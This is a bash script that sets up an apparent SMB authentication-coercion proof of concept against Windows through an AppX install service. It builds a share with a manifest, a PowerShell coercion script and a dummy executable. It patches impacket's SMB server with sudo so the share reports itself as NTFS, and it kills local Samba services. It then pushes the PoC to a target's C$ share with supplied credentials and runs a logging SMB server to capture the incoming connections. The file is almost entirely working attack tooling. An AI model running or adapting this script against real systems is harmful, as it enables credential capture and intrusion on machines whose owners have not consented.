#!/usr/bin/env bash
set -euo pipefail

repo="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
share="${SHARE_DIR:-/tmp/coerceshare}"
target_ip="${TARGET_IP:-}"
target_creds="${TARGET_CREDS:-}"
package_name="${PACKAGE_NAME:-DiscCoerceProbe}"

mkdir -p "$share"
sed "s/DiscCoerceProbe/$package_name/g" "$repo/poc/AppxManifest.xml" > "$share/AppxManifest.xml"
cp "$repo/poc/Invoke-InstallServiceCoerce.ps1" "$share/"

python3 - "$share/logo.png" "$share/dummy.exe" <<'PY'
import base64
import pathlib
import sys

pathlib.Path(sys.argv[1]).write_bytes(base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="))
pathlib.Path(sys.argv[2]).write_bytes(b"MZ" + b"\x00" * 510)
PY

smbserver_py="$(python3 -c "import impacket.smbserver as s, os; print(os.path.abspath(s.__file__))")"
sudo sed -i "s/b'XTFS'/b'NTFS'/g; s/'XTFS'/'NTFS'/g" "$smbserver_py"

sudo systemctl stop smbd nmbd samba-ad-dc winbind 2>/dev/null || true
sudo pkill smbd 2>/dev/null || true
old_pids="$(ps -eo pid,args | awk '/[i]mpacket-smbserver/ && / coerce / {print $1} /[s]mbserver.py/ && / coerce / {print $1}' | tr '\n' ' ')"
if [[ -n "$old_pids" ]]; then
	sudo kill $old_pids 2>/dev/null || true
	sleep 1
fi

if [[ -n "$target_ip" && -n "$target_creds" ]]; then
	smbclient "//$target_ip/C$" -U "$target_creds" -c "put $share/Invoke-InstallServiceCoerce.ps1 Users\\Public\\poc.ps1"
	echo "[+] staged Users\\Public\\poc.ps1 on $target_ip"
else
	echo "[*] TARGET_IP or TARGET_CREDS not set, skipping target staging"
fi

echo "[*] starting SMB server for $share"
echo "[*] logging to /tmp/uncanny_smb.log"
sudo impacket-smbserver coerce "$share" -smb2support -debug 2>&1 | tee /tmp/uncanny_smb.log
